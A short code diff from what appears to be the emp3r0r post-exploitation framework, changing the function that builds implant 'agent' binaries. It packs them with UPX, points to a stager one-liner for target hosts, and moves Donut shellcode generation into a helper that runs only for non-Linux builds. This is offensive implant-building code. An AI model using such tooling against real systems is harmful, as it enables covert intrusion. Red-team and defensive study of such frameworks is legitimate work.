@@ -146,8 +146,9 @@ func modGenAgent() {
 	CliPrintDebug("OneTimeMagicBytes is %x", emp3r0r_data.OneTimeMagicBytes)
 	agent_binary_path = outfile
 
-	// pack it with upx
 	packed_file := fmt.Sprintf("%s.packed.exe", outfile)
+
+	// pack it with upx
 	err = upx(outfile, packed_file)
 	if err != nil {
 		CliPrintWarning("UPX: %v", err)
@@ -169,22 +170,13 @@ func modGenAgent() {
 		return
 	}
 	agent_binary_path = packed_file
-	CliPrint("Generated agent binary: %s."+
+	CliPrint("Generated agent binary: %s. "+
 		"You can `use stager` to generate a one liner for your target host", agent_binary_path)
 
-	// Generate shellcode using donut for the executable files
-	shellcode, err := DonutShellcodeFromFile(agent_binary_path, arch_choice, false, "", "", "")
-	if err != nil {
-		CliPrintError("Donut: %v", err)
-		return
+	if os_choice != "linux" {
+		// generate shellcode for the agent binary
+		DonoutPE2Shellcode(outfile, arch_choice)
 	}
-	shellcode_path := fmt.Sprintf("%s.bin", packed_file)
-	err = os.WriteFile(shellcode_path, shellcode, 0o644)
-	if err != nil {
-		CliPrintError("Failed to save shellcode: %v", err)
-		return
-	}
-	CliPrint("Generated shellcode: %s", shellcode_path)
 }
 
 func MakeConfig() (err error) {
